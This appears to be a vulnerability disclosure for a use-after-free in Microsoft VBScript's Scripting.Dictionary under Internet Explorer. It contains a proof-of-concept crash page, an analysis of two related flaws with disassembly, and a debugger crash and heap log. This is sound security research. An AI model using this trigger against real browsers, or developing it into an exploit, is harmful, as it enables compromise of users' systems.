@@ -1,0 +1,146 @@
+<!--
+There is a use-after-free vulnerability (possibly two vulnerabilities triggerable by the same PoC, see below) in Microsoft VBScript. The vulnerability has been confirmed in Internet Explorer on Windows 7 with the latest patches applied.
+
+PoC:
+(Note that Page Heap might need to be enabled to observe the crash.)
+
+===============================================================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="x-ua-compatible" content="IE=10">
+<script type="text/vbscript">
+
+Class class2
+  Private Sub Class_Terminate()
+    var17.RemoveAll
+  End Sub
+End Class
+
+Set var17 = CreateObject("Scripting.Dictionary")
+Set var17.Item("foo") = new class2
+var17.Item("foo") = 1
+
+</script>
+
+<!--
+===============================================================================
+
+Preliminary Analysis:
+
+1st issue: In OLEAUT32!VariantClear, if the Variant is an object, the object destructor is going to be called and immediately after that the variant type is going to be (un)set. However, the object destructor can call attacker-controlled VBScript and the memory holding the Variant could be freed, as demonstrated by the PoC. This is also visible in the following snippet of code taken from the 64-bit version of OLEAUT32!VariantClear:
+
+000007fe`ff0c11d3 ff5010          call    qword ptr [rax+10h]
+000007fe`ff0c11d6 66892f          mov     word ptr [rdi],bp ds:00000000`0486cfd8=????
+
+2nd issue: Even if the 1st issue was fixed, the PoC would still trigger another issue, which is that VBADictionary::put_Item calls VariantCopy immediately after VariantClear in order to set the new value in the dictionary. If VariantClear deletes the memory containing the variant (as demonstrated earlier), VariantCopy is going to access the freed memory. This is visible in the following snippet of code from VBADictionary::put_Item:
+
+000007fe`f08bd48a ff15200d0100    call    qword ptr [scrrun!_imp_VariantClear (000007fe`f08ce1b0)]
+000007fe`f08bd490 488bd7          mov     rdx,rdi
+000007fe`f08bd493 488bcb          mov     rcx,rbx
+000007fe`f08bd496 ff151c0d0100    call    qword ptr [scrrun!_imp_VariantCopy (000007fe`f08ce1b8)]
+
+Debug log:
+
+===============================================================================
+
+(c08.4a4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000009 ecx=0b93ffb8 edx=00a61078 esi=080e2fe8 edi=00000009
+eip=759c3f3a esp=0a34b6bc ebp=0a34b6c8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+OLEAUT32!VariantClear+0xdb:
+759c3f3a 668906          mov     word ptr [esi],ax        ds:002b:080e2fe8=????
+
+0:008> r
+eax=00000000 ebx=00000009 ecx=0b93ffb8 edx=00a61078 esi=080e2fe8 edi=00000009
+eip=759c3f3a esp=0a34b6bc ebp=0a34b6c8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+OLEAUT32!VariantClear+0xdb:
+759c3f3a 668906          mov     word ptr [esi],ax        ds:002b:080e2fe8=????
+
+0:008> k
+ # ChildEBP RetAddr  
+00 0a34b6c8 7347329a OLEAUT32!VariantClear+0xdb
+01 0a34b6e4 6b2d6ef5 IEShims!NS_ATLMitigation::APIHook_VariantClear+0x5d
+02 0a34b72c 759dcc43 scrrun!VBADictionary::put_Item+0x7e
+03 0a34b74c 759dcabd OLEAUT32!DispCallFunc+0x165
+04 0a34b7dc 6b2d4d25 OLEAUT32!CTypeInfo2::Invoke+0x23f
+05 0a34b80c 6c449b2d scrrun!VBADictionary::Invoke+0x5a
+06 0a34b850 6c449a5e vbscript!IDispatchInvoke2+0xbf
+07 0a34b888 6c450040 vbscript!IDispatchInvoke+0x55
+08 0a34baa4 6c449171 vbscript!InvokeDispatch+0x2c0
+09 0a34bacc 6c423ea1 vbscript!InvokeByName+0x48
+0a 0a34bbe4 6c425d5e vbscript!CScriptRuntime::RunNoEH+0x2d4e
+0b 0a34bc34 6c425c7b vbscript!CScriptRuntime::Run+0xc3
+0c 0a34bd44 6c44e888 vbscript!CScriptEntryPoint::Call+0x10b
+0d 0a34bda8 6c42642b vbscript!CSession::Execute+0x12b
+0e 0a34bdf8 6c42bc88 vbscript!COleScript::ExecutePendingScripts+0x14f
+0f 0a34be74 6c42d1b9 vbscript!COleScript::ParseScriptTextCore+0x2a4
+10 0a34bea0 6d8f69d4 vbscript!COleScript::ParseScriptText+0x29
+11 0a34bed8 6d85fc3b MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+12 0a34bf48 6d46de92 MSHTML!CScriptCollection::ParseScriptText+0x1c6
+13 0a34c034 6d46da6d MSHTML!CScriptData::CommitCode+0x31e
+14 0a34c0b4 6d46e5ac MSHTML!CScriptData::Execute+0x232
+15 0a34c0d4 6d88f214 MSHTML!CHtmScriptParseCtx::Execute+0xed
+16 0a34c128 6d2d54fd MSHTML!CHtmParseBase::Execute+0x201
+17 0a34c144 6d2d4f2f MSHTML!CHtmPost::Broadcast+0x182
+18 0a34c27c 6d31f3ed MSHTML!CHtmPost::Exec+0x617
+19 0a34c29c 6d31f353 MSHTML!CHtmPost::Run+0x3d
+1a 0a34c2b8 6d3268de MSHTML!PostManExecute+0x61
+1b 0a34c2cc 6d327ae8 MSHTML!PostManResume+0x7b
+1c 0a34c2fc 6d301859 MSHTML!CHtmPost::OnDwnChanCallback+0x38
+1d 0a34c314 6d25d4a5 MSHTML!CDwnChan::OnMethodCall+0x2f
+1e 0a34c364 6d25cfcc MSHTML!GlobalWndOnMethodCall+0x1a1
+1f 0a34c3b8 762a62fa MSHTML!GlobalWndProc+0x103
+20 0a34c3e4 762a6d3a user32!InternalCallWinProc+0x23
+21 0a34c45c 762a77c4 user32!UserCallWinProcCheckWow+0x109
+22 0a34c4bc 762a788a user32!DispatchMessageWorker+0x3b5
+23 0a34c4cc 7358ab7c user32!DispatchMessageW+0xf
+24 0a34f69c 735f75f8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+25 0a34f75c 76606b7c IEFRAME!LCIETab_ThreadProc+0x3e7
+26 0a34f774 73473a31 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1c
+27 0a34f7ac 75d6343d IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+28 0a34f7b8 77129832 kernel32!BaseThreadInitThunk+0xe
+29 0a34f7f8 77129805 ntdll!__RtlUserThreadStart+0x70
+2a 0a34f810 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+0:008> !heap -p -a 080e2fe8
+    address 080e2fe8 found in
+    _DPH_HEAP_ROOT @ a61000
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    de00270:          80e2000             2000
+    742990b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+    771c180c ntdll!RtlDebugFreeHeap+0x0000002f
+    7717a8fe ntdll!RtlpFreeHeap+0x0000005d
+    77122c45 ntdll!RtlFreeHeap+0x00000142
+    749898cd msvcrt!free+0x000000cd
+    6b2d62ee scrrun!VBADictNode::`scalar deleting destructor'+0x00000019
+    6b2d61d2 scrrun!VBADictionary::RemoveAll+0x0000004f
+    759dcc43 OLEAUT32!DispCallFunc+0x00000165
+    759dcabd OLEAUT32!CTypeInfo2::Invoke+0x0000023f
+    6b2d4d25 scrrun!VBADictionary::Invoke+0x0000005a
+    6c449b2d vbscript!IDispatchInvoke2+0x000000bf
+    6c449a5e vbscript!IDispatchInvoke+0x00000055
+    6c450040 vbscript!InvokeDispatch+0x000002c0
+    6c449171 vbscript!InvokeByName+0x00000048
+    6c423dcd vbscript!CScriptRuntime::RunNoEH+0x00002c7a
+    6c425d5e vbscript!CScriptRuntime::Run+0x000000c3
+    6c425c7b vbscript!CScriptEntryPoint::Call+0x0000010b
+    6c4361cc vbscript!VBScriptClass::TerminateClass+0x000000a9
+    6c456cc7 vbscript!VBScriptClass::Release+0x00000030
+    759c49fb OLEAUT32!VariantClear+0x000000cf
+    7347329a IEShims!NS_ATLMitigation::APIHook_VariantClear+0x0000005d
+    6b2d6ef5 scrrun!VBADictionary::put_Item+0x0000007e
+    759dcc43 OLEAUT32!DispCallFunc+0x00000165
+    759dcabd OLEAUT32!CTypeInfo2::Invoke+0x0000023f
+    6b2d4d25 scrrun!VBADictionary::Invoke+0x0000005a
+    6c449b2d vbscript!IDispatchInvoke2+0x000000bf
+    6c449a5e vbscript!IDispatchInvoke+0x00000055
+    6c450040 vbscript!InvokeDispatch+0x000002c0
+    6c449171 vbscript!InvokeByName+0x00000048
+    6c423ea1 vbscript!CScriptRuntime::RunNoEH+0x00002d4e
+    6c425d5e vbscript!CScriptRuntime::Run+0x000000c3
+    6c425c7b vbscript!CScriptEntryPoint::Call+0x0000010b
+-->
